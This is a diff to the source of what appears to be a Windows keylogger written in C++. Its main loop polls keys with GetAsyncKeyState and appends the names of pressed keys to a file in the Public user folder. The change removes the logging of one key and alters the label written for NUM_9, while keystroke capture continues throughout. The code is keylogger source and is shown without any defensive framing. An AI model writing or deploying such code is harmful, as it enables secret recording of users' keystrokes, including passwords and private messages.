@@ -19,15 +19,10 @@ int APIENTRY wWinMain(HINSTANCE hInstance,
     while (1)
     {
         fout.open("C:/Users/Public/Python GGKEIT/file.txt", ios::app);
-        if (GetAsyncKeyState(0xBE) == -32767)
-        {
-            fout << "!!!!  ";
-        }
         if (GetAsyncKeyState(0x60) == -32767)
         {
             fout << "NUM_0  ";
         }
-
         if (GetAsyncKeyState(0x61) == -32767)
         {
             fout << "NUM_1  ";
@@ -62,7 +57,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance,
         }
         if (GetAsyncKeyState(0x69) == -32767)
         {
-            fout << "| NUM_9 ";
+            fout << "NUM_9 ";
         }
 
         ///////////////////////////////////////////////
